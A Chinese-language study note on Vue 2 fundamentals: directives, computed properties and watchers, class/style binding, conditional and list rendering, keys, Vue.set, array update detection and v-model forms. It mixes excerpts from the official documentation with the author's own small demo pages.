# Vue2基础

[TOC]



### 1vue属性指令

#### [v-on](https://v2.cn.vuejs.org/v2/api/#v-on)

- **缩写**：`@`

- **预期**：`Function | Inline Statement | Object`

- **参数**：`event`

- **修饰符**：

  - `.stop` - 调用 `event.stopPropagation()`。
  - `.prevent` - 调用 `event.preventDefault()`。
  - `.capture` - 添加事件侦听器时使用 capture 模式。
  - `.self` - 只当事件是从侦听器绑定的元素本身触发时才触发回调。
  - `.{keyCode | keyAlias}` - 只当事件是从特定键触发时才触发回调。
  - `.native` - 监听组件根元素的原生事件。
  - `.once` - 只触发一次回调。
  - `.left` - (2.2.0) 只当点击鼠标左键时触发。
  - `.right` - (2.2.0) 只当点击鼠标右键时触发。
  - `.middle` - (2.2.0) 只当点击鼠标中键时触发。
  - `.passive` - (2.3.0) 以 `{ passive: true }` 模式添加侦听器

- **用法**：

  绑定事件监听器。事件类型由参数指定。表达式可以是一个方法的名字或一个内联语句，如果没有修饰符也可以省略。

  用在普通元素上时，只能监听[**原生 DOM 事件**](https://developer.mozilla.org/zh-CN/docs/Web/Events)。用在自定义元素组件上时，也可以监听子组件触发的**自定义事件**。

  在监听原生 DOM 事件时，方法以事件为唯一的参数。如果使用内联语句，语句可以访问一个 `$event` property：`v-on:click="handle('ok', $event)"`。

  从 `2.4.0` 开始，`v-on` 同样支持不带参数绑定一个事件/监听器键值对的对象。注意当使用对象语法时，是不支持任何修饰器的。

- **示例**：

  ```html
  <!-- 方法处理器 -->
  <button v-on:click="doThis"></button>
  
  <!-- 动态事件 (2.6.0+) -->
  <button v-on:[event]="doThis"></button>
  
  <!-- 内联语句 -->
  <button v-on:click="doThat('hello', $event)"></button>
  
  <!-- 缩写 -->
  <button @click="doThis"></button>
  
  <!-- 动态事件缩写 (2.6.0+) -->
  <button @[event]="doThis"></button>
  
  <!-- 停止冒泡 -->
  <button @click.stop="doThis"></button>
  
  <!-- 阻止默认行为 -->
  <button @click.prevent="doThis"></button>
  
  <!-- 阻止默认行为，没有表达式 -->
  <form @submit.prevent></form>
  
  <!--  串联修饰符 -->
  <button @click.stop.prevent="doThis"></button>
  
  <!-- 键修饰符，键别名 -->
  <input @keyup.enter="onEnter">
  
  <!-- 键修饰符，键代码 -->
  <input @keyup.13="onEnter">
  
  <!-- 点击回调只会触发一次 -->
  <button v-on:click.once="doThis"></button>
  
  <!-- 对象语法 (2.4.0+) -->
  <button v-on="{ mousedown: doThis, mouseup: doThat }"></button>
  ```

  在子组件上监听自定义事件 (当子组件触发“my-event”时将调用事件处理器)：

  ```html
  <my-component @my-event="handleThis"></my-component>
  
  <!-- 内联语句 -->
  <my-component @my-event="handleThis(123, $event)"></my-component>
  
  <!-- 组件中的原生事件 -->
  <my-component @click.native="onClick"></my-component>
  ```

- **参考**：

  - [事件处理器](https://v2.cn.vuejs.org/v2/guide/events.html)
  - [组件 - 自定义事件](https://v2.cn.vuejs.org/v2/guide/components.html#监听子组件事件)

#### [v-bind](https://v2.cn.vuejs.org/v2/api/#v-bind)

- **缩写**：`:`

- **预期**：`any (with argument) | Object (without argument)`

- **参数**：`attrOrProp (optional)`

- **修饰符**：

  - `.prop` - 作为一个 DOM property 绑定而不是作为 attribute 绑定。([差别在哪里？](https://stackoverflow.com/questions/6003819/properties-and-attributes-in-html#answer-6004028))
  - `.camel` - (2.1.0+) 将 kebab-case attribute 名转换为 camelCase。(从 2.1.0 开始支持)
  - `.sync` (2.3.0+) 语法糖，会扩展成一个更新父组件绑定值的 `v-on` 侦听器。

- **用法**：

  动态地绑定一个或多个 attribute，或一个组件 prop 到表达式。

  在绑定 `class` 或 `style` attribute 时，支持其它类型的值，如数组或对象。可以通过下面的教程链接查看详情。

  在绑定 prop 时，prop 必须在子组件中声明。可以用修饰符指定不同的绑定类型。

  没有参数时，可以绑定到一个包含键值对的对象。注意此时 `class` 和 `style` 绑定不支持数组和对象。

- **示例**：

  ```html
  <!-- 绑定一个 attribute -->
  <img v-bind:src="imageSrc">
  
  <!-- 动态 attribute 名 (2.6.0+) -->
  <button v-bind:[key]="value"></button>
  
  <!-- 缩写 -->
  <img :src="imageSrc">
  
  <!-- 动态 attribute 名缩写 (2.6.0+) -->
  <button :[key]="value"></button>
  
  <!-- 内联字符串拼接 -->
  <img :src="'/path/to/images/' + fileName">
  
  <!-- class 绑定 -->
  <div :class="{ red: isRed }"></div>
  <div :class="[classA, classB]"></div>
  <div :class="[classA, { classB: isB, classC: isC }]"></div>
  
  <!-- style 绑定 -->
  <div :style="{ fontSize: size + 'px' }"></div>
  <div :style="[styleObjectA, styleObjectB]"></div>
  
  <!-- 绑定一个全是 attribute 的对象 -->
  <div v-bind="{ id: someProp, 'other-attr': otherProp }"></div>
  
  <!-- 通过 prop 修饰符绑定 DOM attribute -->
  <div v-bind:text-content.prop="text"></div>
  
  <!-- prop 绑定。“prop”必须在 my-component 中声明。-->
  <my-component :prop="someThing"></my-component>
  
  <!-- 通过 $props 将父组件的 props 一起传给子组件 -->
  <child-component v-bind="$props"></child-component>
  
  <!-- XLink -->
  <svg><a :xlink:special="foo"></a></svg>
  ```

  `.camel` 修饰符允许在使用 DOM 模板时将 `v-bind` property 名称驼峰化，例如 SVG 的 `viewBox` property：

  ```
  <svg :view-box.camel="viewBox"></svg>
  ```

  在使用字符串模板或通过 `vue-loader`/`vueify` 编译时，无需使用 `.camel`。

- **参考**：

  - [Class 与 Style 绑定](https://v2.cn.vuejs.org/v2/guide/class-and-style.html)
  - [组件 - Props](https://v2.cn.vuejs.org/v2/guide/components.html#通过-Prop-向子组件传递数据)
  - [组件 - `.sync` 修饰符](https://v2.cn.vuejs.org/v2/guide/components-custom-events.html#sync-修饰符)



### 1.7计算属性和侦听器

![image-20221007192133112](E:\typora\homework\img\vue\image-20221007192133112.png)



#### 1.7.2. 计算属性-computed 

1. 要显示的数据不存在，要通过计算得来。
2.  在 computed 对象中定义计算属性。
3. 在页面中使用{{方法名}}来显示计算的结果。

![image-20221007193316173](E:\typora\homework\img\vue\image-20221007193316173.png)

```js
<body>
    <div id='app'>
        姓<input type="text" v-model="firstName"></br>
        名<input type="text" v-model="lastName"></br>
        <div>全名:{{fullName}}</div>
        <div>全名:{{fullName}}</div>
        <div>全名:{{fullName}}</div>
        <div>全名:{{fullName}}</div>
        <div>全名:{{fullName}}</div>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        firstName:'帅',
        lastName:'哥'
    },
    methods: {
    },
    computed:{
        fullName:{
            // 当读取元素fullName时就会调用get 被计算机的属性发生了改变是调用get
            
            get(){
                console.log("get被调用了");
                return this.firstName+this.lastName;
            },
            // set在fullName被修改时调用
            set(value){
                console.log("set被调用了",value);
                let arr = value.split('-')
                this.firstName = arr[0];
                this.lastName = arr[1];
            }
        }
    }
    })
    </script>
</body>
```

**计算属性简写只读 **

```js
    computed:{
		// 计算属性简写形式 假如只使用get方法不修改计算属性
        fullName:function(){
            console.log("get被调用了");
            return this.firstName+this.lastName;
        }
    }
```

#### 1.7.3监视属性

1. 通过 vm 对象的$watch()或 watch 配置来监视指定的属性
2. 当属性变化时, 回调函数自动调用, 在函数内部进行计算

```js
<body>
    <div id='app'>
        <div>今天的天气{{weather}}</div>
        <button @click="switchw">切换天气</button>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{
        isHot:true  
    },
    methods: {
        switchw(){
            this.isHot=!this.isHot;
        }
    },
    computed:{
        weather(){
            return this.isHot?'好热':'好冷';
        }
    },
    watch:{
        isHot:{
            
            immediate:true,
            handler(newValue,oldValue){
                console.log('监视到isHot被修改了',newValue,oldValue);
            }
        }
    }
    })

    </script>
</body>
```

##### 监视配置项方式实现监视指定的属性

```js
    vm.$watch('isHot',{
        // 立即执行 在页面创建的时候立即执行一次
        immediate:true,
        handler(newValue,oldValue){
            console.log('监视到isHot被修改了',newValue,oldValue);
        }     
    })
```

#### 1.7.4深度监视

![image-20221007205539627](E:\typora\homework\img\vue\image-20221007205539627.png)

**监视多级属性下面的一个属性或者计算属性发生变化**

```js
    data:{
        isHot:true,
        numbers:{
            a:11,
            b:22
        }  
    },
    watch:{

        'numbers.a':{
            immediate:true,
            handler(newValue,oldValue){
                console.log('监视到bumbers.a被修改了',newValue,oldValue);
            }
        }
    }
```

**开启深度监视**

```js
        'numbers':{
            deep:true,
            immediate:true,
            handler(newValue,oldValue){
                console.log('监视到bumbers被修改了',newValue,oldValue);
            }
        }
```

### 1.8. class 与 style 绑定

#### 1.8.1. class 绑定 

1. :class='xxx' 

2. 表达式是字符串: 'classA'
3. 表达式是对象: {classA:isA, classB: isB} 
4. 表达式是数组: ['classA', 'classB']

#### 对象语法

我们可以传给 `v-bind:class` 一个对象，以动态地切换 class：

```html
<div v-bind:class="{ active: isActive }"></div>
```

上面的语法表示 `active` 这个 class 存在与否将取决于数据 property `isActive` 的 ==逻辑值(真或者假)==。

你可以在对象中传入更多字段来动态切换多个 class。此外，`v-bind:class` 指令也可以与普通的 class 属性共存

```html
<div
  class="static"
  v-bind:class="{ active: isActive, 'text-danger': hasError }"
></div>
```

和如下 data：

```js
data: {
  isActive: true,
  hasError: false
}
```

结果渲染为：

```html
<div class="static active"></div>
```



当 `isActive` 或者 `hasError` 变化时，class 列表将相应地更新。例如，如果 `hasError` 的值为 `true`，class 列表将变为 `"static active text-danger"`。



绑定的数据对象不必内联定义在模板里：

```html
<div v-bind:class="classObject"></div>
data: {
  classObject: {
    active: true,
    'text-danger': false
  }
}
```

渲染的结果和上面一样。我们也可以在这里绑定一个返回对象的[计算属性](https://v2.cn.vuejs.org/v2/guide/computed.html)。这是一个常用且强大的模式：

```html
<div v-bind:class="classObject"></div>
data: {
  isActive: true,
  error: null
},
computed: {
  classObject: function () {
	//绑定的class样式可以通过一个计算属性return返回
    return {
      active: this.isActive && !this.error,
      'text-danger': this.error && this.error.type === 'fatal'
    }
  }
}
```

对象语法切换class样式小案例

```html
    <style>
        .basic{
            width:100px;
            height:100px;
            background-color:red;
        }
        .b{
            font-size 30px;
            background-color:blue;
        }
        .c{
            font-size 50px;
            background-color:yellow;
        }
        .d{
            font-size 70px;
            background-color:green;
        }
        .e{
            width: 200px;
            height: 200px;
        }
    </style>
</head>
<body>
    <div  id='app'>
        <div v-bind:class='current'  class='basic'>好好看</div>
        <button v-on:click="turn">点击切换样式</button>
        <!-- 使用对象形式指定一个样式 -->
        <div v-bind:class='classObj'  class='basic'>好好看</div>
        <button v-on:click="turn1">点击切换样式</button>
    </div>
  
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        current:'b',
        // 绑定一个对象 其中元素的名字就是类名
        classObj:{
            d:false,
            e:false
        }
    },
    methods: {
        // 随机切换一个样式
         turn(){
            let arr = ['b','c','d']
            // 取0到3的随机数
            let index = Math.floor(Math.random()*3);
            console.log(index);
            this.current = arr[index];
         },
         turn1(){
            this.classObj.d =!this.classObj.d;
            this.classObj.e =!this.classObj.e;
         }
    }
    })
    </script>
</body>
```



#### 数组语法

我们可以把一个数组传给 `v-bind:class`，以应用一个 class 列表：

```html
<div v-bind:class="[activeClass, errorClass]"></div>
data: {
  activeClass: 'active',
  errorClass: 'text-danger'
}
```

渲染为：

```html
<div class="active text-danger"></div>
```

如果你也想根据条件切换列表中的 class，可以用三元表达式：

```html
<div v-bind:class="[isActive ? activeClass : '']"></div>
```



这样写将始终添加 `errorClass`，但是只有在 `isActive` 是true 时才添加 `activeClass`。

不过，当有多个条件 class 时这样写有些繁琐。所以在数组语法中也可以使用对象语法：



```html
<div v-bind:class="[{ active: isActive }, errorClass]"></div>
```



#### 1.8.2style 绑定

##### [对象语法](https://v2.cn.vuejs.org/v2/guide/class-and-style.html#对象语法-1)

`v-bind:style` 的对象语法十分直观——看着非常像 CSS，但其实是一个 JavaScript 对象。CSS property 名可以用驼峰式 (camelCase) 或短横线分隔 (kebab-case，记得用引号括起来) 来命名：

```html
<div v-bind:style="{ color: activeColor, fontSize: fontSize + 'px' }"></div>
data: {
  activeColor: 'red',
  fontSize: 30
}
```

直接绑定到一个样式对象通常更好，这会让模板更清晰：

```html
<div v-bind:style="styleObject"></div>
data: {
  styleObject: {
    color: 'red',
    fontSize: '13px'
  }
}
```

同样的，对象语法常常结合返回对象的计算属性使用。

计算属性切换样式小案例

```html
<body>
    <div id='app'>
        <div  v-bind:style='objStyle'>绑定style</div>
        <!-- <div>当前样式{{color}}</div>
        <div>当前样式{{fontSize}}</div> -->
        <button @click='turn'>按一下</button>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        color: 'red',
        fontSize: '13px'
    },
    methods: {
        // 切换样式
        turn(){
            let colorArr=['red','blue','yellow'];
            let i = Math.floor(Math.random()*3);
            let size = (i*15+10)+'px'
            this.color=colorArr[i];
            this.fontSize = size;
        }
    },
    // 通过计算属性控制样式
    computed:{ 
        objStyle:{
            get(){
                console.log('执行了');

                return {
                    color : this.color,
                    fontSize : this.fontSize
                }
            }

        }
    }
    })
    </script>
</body>
```

[数组语法](https://v2.cn.vuejs.org/v2/guide/class-and-style.html#数组语法-1)

`v-bind:style` 的数组语法可以将多个样式对象应用到同一个元素上：

```html
<div v-bind:style="[baseStyles, overridingStyles]"></div>
```



### 1.9. 条件渲染

#### 1.9.1[v-if](https://v2.cn.vuejs.org/v2/guide/conditional.html#v-if)

[观看本节视频讲解](https://learning.dcloud.io/#/?vid=8)

`v-if` 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 true的时候被渲染,当为false的时候会从DOM中移除所渲染的元素,当为true重新添加这个元素到DOM结构中。

```html
<h1 v-if="awesome">Vue is awesome!</h1>
```

也可以用 `v-else` 添加一个“else 块”：

```html
<h1 v-if="awesome">Vue is awesome!</h1>
<h1 v-else>Oh no 😢</h1>
```



因为 `v-if` 是一个指令，所以必须将它添加到一个元素上。但是如果想切换多个元素呢？此时可以把一个 `<template>` 元素当做不可见的包裹元素，并在上面使用 `v-if`。最终的渲染结果将不包含 `<template>` 元素。

```html
<template v-if="true">
  <h1>Title</h1>
  <p>Paragraph 1</p>
  <p>Paragraph 2</p>
</template>
```

template元素不会影响DOM结构

![image-20221010161222962](E:\typora\homework\img\vue\image-20221010161222962.png)

如图没有template元素

#### 1.9.2  [v-else](https://v2.cn.vuejs.org/v2/guide/conditional.html#v-else)

你可以使用 `v-else` 指令来表示 `v-if` 的“else 块”：

```html
<div v-if="Math.random() > 0.5">
  Now you see me
</div>
<div v-else>
  Now you don't
</div>
```

`v-else` 元素必须紧跟在带 `v-if` 或者 `v-else-if` 的元素的后面，否则它将不会被识别。

#### [v-else-if](https://v2.cn.vuejs.org/v2/guide/conditional.html#v-else-if)

> 2.1.0 新增

`v-else-if`，顾名思义，充当 `v-if` 的“else-if 块”，可以连续使用：

```html
<div v-if="type === 'A'">
  A
</div>
<div v-else-if="type === 'B'">
  B
</div>
<div v-else-if="type === 'C'">
  C
</div>
<div v-else>
  Not A/B/C
</div>
```

类似于 `v-else`，`v-else-if` 也必须紧跟在带 `v-if` 或者 `v-else-if` 的元素之后。



#### 1.9.3[`v-show`](https://v2.cn.vuejs.org/v2/guide/conditional.html#v-show)

另一个用于根据条件展示元素的选项是 `v-show` 指令。用法大致一样：

```
<h1 v-show="ok">Hello!</h1>
```

不同的是带有 `v-show` 的元素始终会被渲染并保留在 DOM 中。`v-show` 只是简单地切换元素的 CSS property `display`。切换为display:none 或者display:block。v-show只是隐藏了元素 但是元素还在DOM中存在。

![image-20221010161935784](E:\typora\homework\img\vue\image-20221010161935784.png)

注意，`v-show` 不支持 `<template>` 元素，也不支持 `v-else`。

#### 1.9.4[`v-if` vs `v-show`](https://v2.cn.vuejs.org/v2/guide/conditional.html#v-if-vs-v-show)

`v-if` 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。

`v-if` 也是**惰性的**：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。

相比之下，`v-show` 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。

一般来说，`v-if` 有更高的切换开销，而 `v-show` 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 `v-show` 较好；如果在运行时条件很少改变，则使用 `v-if` 较好。





### 1.10列表渲染

#### 1.10.1[用 `v-for` 遍历数组元素](https://v2.cn.vuejs.org/v2/guide/list.html#用-v-for-把一个数组对应为一组元素)

我们可以用 `v-for` 指令基于一个数组来渲染一个列表。`v-for` 指令需要使用 `item in items` 形式的特殊语法，其中 `items` 是源数据数组，而 `item` 则是被迭代的数组元素的**别名**。

```html
<ul id="example-1">
  <li v-for="item in items" :key="item.message">
    {{ item.message }}
  </li>
</ul>
var example1 = new Vue({
  el: '#example-1',
  data: {
    items: [
      { message: 'Foo' },
      { message: 'Bar' }
    ]
  }
})
```

结果：

![image-20221010163741667](E:\typora\homework\img\vue\image-20221010163741667.png)

在 `v-for` 块中，我们可以访问所有父作用域的 property。`v-for` 还支持一个可选的第二个参数，即当前项的索引。

```html
<ul id="example-2">
  <li v-for="(item, index) in items">
    {{ parentMessage }} - {{ index }} - {{ item.message }}
  </li>
</ul>
var example2 = new Vue({
  el: '#example-2',
  data: {
    parentMessage: 'Parent',
    items: [
      { message: 'Foo' },
      { message: 'Bar' }
    ]
  }
})
```

结果：

- Parent - 0 - Foo
- Parent - 1 - Bar

你也可以用 `of` 替代 `in` 作为分隔符，因为它更接近 JavaScript 迭代器的语法：

```
<div v-for="item of items"></div>
```

v-for也可以遍历字符串 操作同遍历数组相同

#### 1.10.2[在 `v-for` 里遍历对象元素](https://v2.cn.vuejs.org/v2/guide/list.html#在-v-for-里使用对象)

你也可以用 `v-for` 来遍历一个对象的 property。

```html
<ul id="v-for-object" class="demo">
  <li v-for="value in object">
    {{ value }}
  </li>
</ul>
new Vue({
  el: '#v-for-object',
  data: {
    object: {
      title: 'How to do lists in Vue',
      author: 'Jane Doe',
      publishedAt: '2016-04-10'
    }
  }
})
```

你也可以提供第二个的参数为 property 名称 (也就是键名)：

```html
<div v-for="(value, name) in object">
  {{ name }}: {{ value }}
</div>
```

还可以用第三个参数作为索引：

```html
<div v-for="(value, name, index) in object">
  {{ index }}. {{ name }}: {{ value }}
</div>
```

![image-20221010164207381](E:\typora\homework\img\vue\image-20221010164207381.png)

在遍历对象时，会按 `Object.keys()` 的结果遍历，但是**不能**保证它的结果在不同的 JavaScript 引擎下都一致。

#### 1.10.3[维护状态](https://v2.cn.vuejs.org/v2/guide/list.html#维护状态)

当 Vue 正在更新使用 `v-for` 渲染的元素列表时，它默认使用“就地更新”的策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序，而是就地更新每个元素，并且确保它们在每个索引位置正确渲染。这个类似 Vue 1.x 的 `track-by="$index"`。

这个默认的模式是高效的，但是**只适用于不依赖子组件状态或临时 DOM 状态 (例如：表单输入值) 的列表渲染输出**。

为了给 Vue 一个提示，以便它能跟踪每个节点的身份，从而重用和重新排序现有元素，你需要为每项提供一个唯一 `key` attribute：

```html
<div v-for="item in items" v-bind:key="item.id">
  <!-- 内容 -->
</div>
```

建议尽可能在使用 `v-for` 时提供 `key` attribute，除非遍历输出的 DOM 内容非常简单，或者是刻意依赖默认行为以获取性能上的提升。

因为它是 Vue 识别节点的一个通用机制，`key` 并不仅与 `v-for` 特别关联。后面我们将在指南中看到，它还具有其它用途。

不要使用对象或数组之类的非基本类型值作为 `v-for` 的 `key`。请用字符串或数值类型的值。





### [1.11key](https://v2.cn.vuejs.org/v2/api/#key)

- **预期**：`number | string | boolean (2.4.2 新增) | symbol (2.5.12 新增)`

  `key` 的特殊 attribute 主要用在 Vue 的虚拟 DOM 算法，在新旧 nodes 对比时辨识 VNodes。如果不使用 key，Vue 会使用一种最大限度减少动态元素并且尽可能的尝试就地修改/复用相同类型元素的算法。而使用 key 时，它会基于 key 的变化重新排列元素顺序，并且会移除 key 不存在的元素。

  有相同父元素的子元素必须有**独特的 key**。重复的 key 会造成渲染错误。

  最常见的用例是结合 `v-for`：

  ```html
  <ul>
    <li v-for="item in items" :key="item.id">...</li>
  </ul>
  ```

  


#### 1.11.1key的小案例

**vue默认数组下标index 为key值会有以下的问题**

```html
<body>
    <div id='app'>
        <ul>
            <li v-for='(p,index) in persons'>
                名字:{{p.name}}----年龄:{{p.age}}
                <input type="text">
            </li>
        </ul>
        <button @click='add'>再添加一个老刘</button>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{
        persons:[
            {id:'001',name:'张三',age:18},
            {id:'002',name:'李四',age:18},
            {id:'003',name:'王五',age:18}
        ]  
    },
    methods: {
        add(){
            let tempt=   {id:'004',name:'老刘',age:22};
            this.persons.unshift(tempt);
        }
    }
    })
    </script>
</body>
```

**当在第一个元素之前添加新元素时 ，新元素的index下标为0这使得其他元素的index下标都会增加一,vue只会更新相同key中变化的数据 也就是标签中的数据,所以在新添加元素的时候要使用唯一标识key**

![image-20221015160136073](E:\typora\homework\img\vue\image-20221015160136073.png)

![image-20221015160533353](E:\typora\homework\img\vue\image-20221015160533353.png)

#### 1.11.2使用index为key和 唯一id为key的对比

使用index效率会更低 而且在破坏index索引顺序时会产生错误问题

![image-20221015160658461](E:\typora\homework\img\vue\image-20221015160658461.png)

用唯一id作为key效率更高且不会产生错误

![image-20221015161136266](E:\typora\homework\img\vue\image-20221015161136266.png)

![image-20221015160734312](E:\typora\homework\img\vue\image-20221015160734312.png)

### 1.12列表过滤

按照关键词进行列表的过滤，筛选出有关键词的元素

```html
<body>
    <div id='app'>
      <input type="text" v-model='keyValue'>
      <ul id="v-for-object" class="demo">
        <li v-for="(value,key,index) in newObject" :key="value.id">
            id:{{value.id }}-----姓名:{{ value.name }}-----年龄:{{value.age}}
        </li>  
      </ul>
    </div>
    <script src='../vue.js'></script>
      <script>
            new Vue({
            el: '#app',
            data: {
              keyValue:'',
              object:[
                {id:'001',name:'小明',age:23},
                {id:'002',name:'中明',age:42},
                {id:'003',name:'大明',age:15},
                {id:'004',name:'特大明',age:9}
              ],
              // newObject:[]
            },
            // 使用监视属性来过滤列表
            // watch:{
            //   keyValue:{
            //     immediate:true,

            //     handler(n){
            //     console.log(n);
            //     this.newObject=this.object.filter((p)=>{
            //       // 在姓名中查找 指定关键词
            //        return p.name.indexOf(n) !== -1;
            //      })
            //     }            
            //   }
            // }
            // 使用计算属性来过滤列表
            computed:{
              // newObject 通过计算得到
              newObject(){
                return this.object.filter((p)=>{
                  // 在姓名中查找 指定关键词
                   return p.name.indexOf(this.keyValue) !== -1;
                 })
              }
            }
        })
      </script>

</body>
```

### 1.13vue的数据监测

**在vue中给数组对象赋值vue监测不到改变**

```js
        persons:{
                [
                    {id:'001',name:'mengmeng',age:30},
                    {id:'002',name:'帅帅',age:30}     
             ]
            }
```

**例如这样**

```js
        update_2(){
            this.persons[0] =   {id:'003',name:'大帅哥',age:39}
        }
```

**只有单独赋值才能监测到改变**

```js
        update_1(){
            this.persons[0].name='哥哥'
            this.persons[0].age=19
        }
```

### 1.14vue.set() API方法

**当我想动态的往vue实例数据中添加新的数据时,直接添加是没有get set方法的,不是一个响应式的数据**



![image-20221020204507002](E:\typora\homework\img\vue\image-20221020204507002.png)

**而我们想添加一个响应式的数据能被vue所解析,就要使用vue官方提供的set() API**

![image-20221020205016683](E:\typora\homework\img\vue\image-20221020205016683.png)

**但是这个API不能直接给vue 实例 或者根数据身上添加属性 比如_data**

![image-20221020205208720](E:\typora\homework\img\vue\image-20221020205208720.png)

#### 1.14.2   vue 官方文档set解释[Vue.set( target, propertyName/index, value )](https://v2.cn.vuejs.org/v2/api/#Vue-set)

- **参数**：

  - `{Object | Array} target` 目标对象
  - `{string | number} propertyName/index` 属性名字或者索引下标
  - `{any} value` 要设置的值

- **返回值**：设置的值。

- **用法**：

  向响应式对象中添加一个 property，并确保这个新 property 同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新 property，因为 Vue 无法探测普通的新增 property (比如 `this.myObject.newProperty = 'hi'`)

  注意对象不能是 Vue 实例，或者 Vue 实例的根数据对象。

### 1.15 vue [数组更新检测](https://v2.cn.vuejs.org/v2/guide/list.html#数组更新检测)

**在vue对象中的数组元素用下标更改元素 vue是不会监视到的不会显示到页面中**

![image-20221022212106564](E:\typora\homework\img\vue\image-20221022212106564.png)

#### 1.15.1[数组变更方法](https://v2.cn.vuejs.org/v2/guide/list.html#变更方法)

Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括：

- `push()`
- `pop()`
- `shift()` 删除第一个元素
- `unshift()`
- `splice()` 替换元素
- `sort()`
- `reverse()`

你可以打开控制台，然后对前面例子的 `items` 数组尝试调用变更方法。比如 `example1.items.push({ message: 'Baz' })`。



以上数组自带的方法都是经过vue包装的,所以使用这些方法来改变数组中的元素才会被vue监听到,所以直接使用数组下标更改不会被vue监听到,所以页面视图不会刷新改变

![image-20221022212527979](E:\typora\homework\img\vue\image-20221022212527979.png)

#### 1.15.2 使用vue.set()更改数组

使用vue.set也能更改数组中的元素,可以被vue所监听到.

![image-20221022213121926](E:\typora\homework\img\vue\image-20221022213121926.png)

#### [替换数组](https://v2.cn.vuejs.org/v2/guide/list.html#替换数组)

#####  `splice()`方法使用

JavaScript中的splice主要用来对js中的数组进行操作，包括删除，添加，替换等。

1.删除-用于删除元素，两个参数，第一个参数（要删除第一项的位置），第二个参数（要删除的项数） 
2.插入-向数组指定位置插入任意项元素。三个参数，第一个参数（插入位置），第二个参数（0），第三个参数（插入的项） 
3.替换-向数组指定位置插入任意项元素，同时删除任意数量的项，三个参数。第一个参数（起始位置），第二个参数（删除的项数），第三个参数（插入任意数量的项） 



**1.删除功能，第一个参数为第一项位置，第二个参数为要删除几个。**

array.splice(index,num)，返回值为删除内容，array为==结果值==。

![image-20221216195538741](E:\typora\homework\img\vue\image-20221216195538741.png)

**2.插入功能， 第一个参数（插入位置），第二个参数（0），第三个参数（插入的项）**
array.splice(index,0,insertValue)，返回值为空数组，array值为最终结果值

![image-20221216195636219](E:\typora\homework\img\vue\image-20221216195636219.png)

**3.替换功能， 第一个参数（起始位置），第二个参数（删除的项数），第三个参数（插入任意数量的项）**
array.splice(index,num,insertValue)，返回值为删除内容，array为结果值

![image-20221216195705276](E:\typora\homework\img\vue\image-20221216195705276.png)





变更方法，顾名思义，会变更调用了这些方法的原始数组。相比之下，也有非变更方法，例如 `filter()`、`concat()` 和 `slice()`。它们不会变更原始数组，而**总是返回一个新数组**。当使用非变更方法时，可以用新数组替换旧数组：

```
example1.items = example1.items.filter(function (item) {
  return item.message.match(/Foo/)
})
```

你可能认为这将导致 Vue 丢弃现有 DOM 并重新渲染整个列表。幸运的是，事实并非如此。Vue 为了使得 DOM 元素得到最大范围的重用而实现了一些智能的启发式方法，所以用一个含有相同元素的数组去替换原来的数组是非常高效的操作。

#### [注意事项](https://v2.cn.vuejs.org/v2/guide/list.html#注意事项)

由于 JavaScript 的限制，Vue **不能检测**数组和对象的变化。[深入响应式原理](https://v2.cn.vuejs.org/v2/guide/reactivity.html#检测变化的注意事项)中有相关的讨论。



**vue监视属性总结**

![image-20221025155614911](E:\typora\homework\img\vue\image-20221025155614911.png)



### 1.16 vue表单输入绑定

![image-20221026200315478](E:\typora\homework\img\vue\image-20221026200315478.png)

#### [基础用法](https://v2.cn.vuejs.org/v2/guide/forms.html#基础用法)

你可以用 `v-model` 指令在表单 `<input>`、`<textarea>` 及 `<select>` 元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 `v-model` 本质上不过是语法糖。它负责监听用户的输入事件以更新数据，并对一些极端场景进行一些特殊处理。

`v-model` 会忽略所有表单元素的 `value`、`checked`、`selected` attribute 的初始值而总是将 Vue 实例的数据作为数据来源。你应该通过 JavaScript 在组件的 `data` 选项中声明初始值。

`v-model` 在内部为不同的输入元素使用不同的 property 并抛出不同的事件：

- text 和 textarea 元素使用 `value` property 和 `input` 事件；
- checkbox 和 radio 使用 `checked` property 和 `change` 事件；
- select 字段将 `value` 作为 prop 并将 `change` 作为事件。

```html
<body>
    <div id='app'>
        <!-- 阻止默认行为-->
        <form action="" @submit.prevent="demo">
            账号:<input type="text" v-model="account"><br/>
            密码:<input type="password" v-model="password"><br/>
            性别:
            <!-- v-model默认收集value的值 -->
            男<input type="radio" name='sex' v-model="sex" value="male">
            女<input type="radio" name='sex' v-model="sex" value="female"><br><br>
            年龄:<input type="number" v-model.number="age"><br><br>
            
            爱好:
            <!-- 复选框model 绑定一个数组来接收value值 -->
            学习<input type="checkbox" v-model="hobby" value="xue">
            打游戏<input type="checkbox" v-model="hobby" value="da">
            吃饭<input type="checkbox" v-model="hobby" value="chi">
            <br><br>
            所属校区
            <select name="" id="" v-model="city">
                <option value="">选择校区</option>
                <option value="bei">北京</option>
                <option value="shang">上海</option>
                <option value="shen">深圳</option>
                <option value="hang">选择杭州校区</option>
            </select>
            <br><br>
            其他信息:
            <textarea name="" id="" cols="30" rows="10" v-model.lazy='other'></textarea><br><br>
            <input type="checkbox" v-model='checked'>阅读并接受<a href="">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script src='../vue.js'></script>
    <script>
    var vm =new Vue({
    el:'#app',
    data:{  
        account:'',
        password:'',
        sex:'male',
        age:11,
        hobby:[],
        city:'',
        other:'',
        checked:false
    },
    methods: {
        //提交函数
        demo(){
           console.log(JSON.stringify(this._data));
        }
    }
    })
    </script>
</body>
```



#### [文本](https://v2.cn.vuejs.org/v2/guide/forms.html#文本)

```html
<input v-model="message" placeholder="edit me">
